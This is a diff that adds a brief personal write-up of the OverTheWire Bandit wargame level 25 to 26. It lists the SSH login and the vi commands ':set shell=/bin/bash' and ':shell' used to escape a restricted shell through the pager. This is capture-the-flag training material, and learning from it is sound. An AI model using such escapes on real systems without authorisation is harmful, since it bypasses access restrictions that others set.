@@ -1,0 +1,17 @@
+# Bandit Level 25 → Level 26
+
+## What I did
+I escaped a restricted shell by abusing how the terminal pager worked.
+
+## Commands I used
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+v
+:set shell=/bin/bash
+:shell
+
+## Result
+I gained shell access as the next user.
+
+## What I learned
+- How restricted shells work
+- Escaping shells using editor features
